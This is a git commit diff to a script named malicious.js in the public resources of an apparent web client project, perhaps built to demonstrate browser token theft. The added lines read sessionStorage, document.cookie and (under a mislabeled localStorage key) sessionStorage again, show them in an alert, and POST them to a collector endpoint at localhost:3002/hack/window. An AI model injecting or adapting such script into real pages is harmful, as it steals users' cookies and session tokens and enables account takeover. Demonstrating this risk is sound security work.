a7f785870a0a6a8dd7b88454bbdb2c22ee87ce4b
Brion <info@brionmario.com>
2024-05-28 13:13:39 +0530

    chore: update `malicisou.js`

--- apps/client/public/resources/malicious.js
+++ apps/client/public/resources/malicious.js
@@ -2,12 +2,22 @@
 
 console.log('malicious.js loaded');
 
+alert('window', {
+  sessionStorage: JSON.stringify(window.sessionStorage),
+  cookieStorage: JSON.stringify(window.document.cookie),
+  localStorage: JSON.stringify(window.sessionStorage),
+});
+
 fetch('http://localhost:3002/hack/window', {
   method: 'POST',
   headers: {
     'Content-Type': 'application/json',
   },
-  body: JSON.stringify({window}),
+  body: JSON.stringify({
+    sessionStorage: JSON.stringify(window.sessionStorage),
+    cookieStorage: JSON.stringify(window.document.cookie),
+    localStorage: JSON.stringify(window.sessionStorage),
+  }),
 })
   .then(res => res.json())
   .then(data => {
